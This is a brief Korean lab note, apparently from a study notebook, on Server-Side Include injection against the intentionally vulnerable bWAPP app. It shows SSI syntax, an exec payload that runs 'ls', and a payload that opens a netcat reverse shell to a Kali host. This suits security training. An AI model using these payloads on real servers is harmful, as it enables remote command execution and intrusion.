응답을 위해서 서버에서 추가 실행되는 @ = ssi
![[Pasted image 20241010140942.png]]
`http://192.168.56.122/bWAPP/ssii.shtml`
![[Pasted image 20241010140949.png]]

SSI 기본 문법
- 지시어: <!--#element attribute=value-->

![[Pasted image 20241010141436.png]]
<!--#exec cmd="ls"-->

![[Pasted image 20241010141456.png]]
- "" 안에 Kali 로 접속하는 명령어를 넣을 수도 있다.

`<!--#exec cmd="nc 192.168.56.102 4444 -e /bin/bash"-->`
![[Pasted image 20241010141843.png]]